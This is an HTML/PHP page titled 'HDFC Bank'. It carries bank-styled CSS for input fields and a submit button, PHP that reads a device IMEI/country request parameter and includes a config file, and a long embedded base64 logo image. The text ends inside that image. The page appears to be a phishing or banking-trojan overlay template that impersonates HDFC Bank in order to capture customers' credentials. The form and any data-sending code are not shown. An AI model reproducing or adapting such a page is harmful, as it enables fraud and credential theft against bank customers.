<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HDFC Bank</title>

    <style type="text/css">
        body {
            width: auto;
            color: #000000;
            font-size: small;
            font-family: Arial, Sans-Serif;
            margin: 0;
            padding: 0;
            background: #FF5D27
        }

        img {
            border: 0;
            margin-top: 5px;
            max-width: 100%;
        }

        .content {
            padding: 0px !important;
            margin-left: auto !important;
            margin-right: auto !important;
            text-align: center;
        }


        .submit-button {
            width: 110px;
            border-radius: 6px;
            background: rgb(0, 138, 255) none repeat scroll 0 0;
            font-weight: bold;
            margin-right: 10px;
            border: 0 none #036;
            margin-top: 10px;
            height: 40px;
            color: #fff;
        }

        .teaser_box {
            margin-bottom: 10px;
            border-color: #FFFFFF;
            padding: 4px 0
        }


        .field-block {
            padding: 4px 0
        }

.input-field {
    width: 90%;
    border: 0px solid grey;
    border-bottom: 1px solid #fff;
    background: transparent;
    height: 30px;
    color: #fff;
    text-align: center;
    margin-top: 10px;
}

        .input-field:focus {
            box-shadow: 0 0 7px #06F;
        }

        .fielderror {
            border: 1px solid #f00;
    width: 90%;
    background: transparent;
    height: 30px;
    color: #fff;
    text-align: center;
    margin-top: 10px;
        }
    </style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body>

<div class="content" id="content_div">
    <img src="data:image/gif;base64,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